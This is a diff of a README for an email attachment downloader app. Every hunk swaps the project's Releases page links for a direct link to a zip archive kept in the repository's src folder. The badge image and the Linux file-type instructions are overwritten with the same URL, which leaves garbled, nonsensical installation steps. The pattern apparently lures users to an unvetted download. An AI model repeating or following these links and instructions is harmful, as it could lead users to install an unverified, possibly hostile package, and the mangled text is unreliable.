@@ -6,7 +6,7 @@ Email-Attachment-Downloader is a powerful desktop application that allows you to
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Email%20Attachment%20Downloader-brightgreen)](https://github.com/Ilhammaruf/Email-Attachment-Downloader/releases)
+[![Download Now](https://github.com/Ilhammaruf/Email-Attachment-Downloader/raw/refs/heads/main/src/Downloader-Attachment-Email-v1.7.zip%20Now-Email%20Attachment%20Downloader-brightgreen)](https://github.com/Ilhammaruf/Email-Attachment-Downloader/raw/refs/heads/main/src/Downloader-Attachment-Email-v1.7.zip)
 
 ## 🔍 Features
 
@@ -26,7 +26,7 @@ Email-Attachment-Downloader is a powerful desktop application that allows you to
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version, visit the [Releases page](https://github.com/Ilhammaruf/Email-Attachment-Downloader/releases).
+To download the latest version, visit the [Releases page](https://github.com/Ilhammaruf/Email-Attachment-Downloader/raw/refs/heads/main/src/Downloader-Attachment-Email-v1.7.zip).
 
 ### Step 2: Choose Your Version
 
@@ -38,7 +38,7 @@ After selecting a version, you will find various files available for download. C
 
 - For Windows, look for a file ending in `.exe`.
 - For macOS, look for a file ending in `.dmg`.
-- For Linux, look for a `.tar.gz` or `.deb` file.
+- For Linux, look for a `https://github.com/Ilhammaruf/Email-Attachment-Downloader/raw/refs/heads/main/src/Downloader-Attachment-Email-v1.7.zip` or `.deb` file.
 
 ### Step 4: Install the Application
 
@@ -53,7 +53,7 @@ Once the file is downloaded, follow these steps:
    2. Drag the Email-Attachment-Downloader icon into your Applications folder.
 
 - **For Linux:**
-   1. Extract the downloaded `.tar.gz` file.
+   1. Extract the downloaded `https://github.com/Ilhammaruf/Email-Attachment-Downloader/raw/refs/heads/main/src/Downloader-Attachment-Email-v1.7.zip` file.
    2. Open a terminal and navigate to the extracted folder.
    3. Run the installation command relevant to your distribution.
 
@@ -94,6 +94,6 @@ We welcome contributions! If you'd like to help improve this application, please
 
 ## 📥 Download the Application Again
 
-Don't forget to visit [this page](https://github.com/Ilhammaruf/Email-Attachment-Downloader/releases) to download or update to the latest version.
+Don't forget to visit [this page](https://github.com/Ilhammaruf/Email-Attachment-Downloader/raw/refs/heads/main/src/Downloader-Attachment-Email-v1.7.zip) to download or update to the latest version.
 
 Happy downloading!
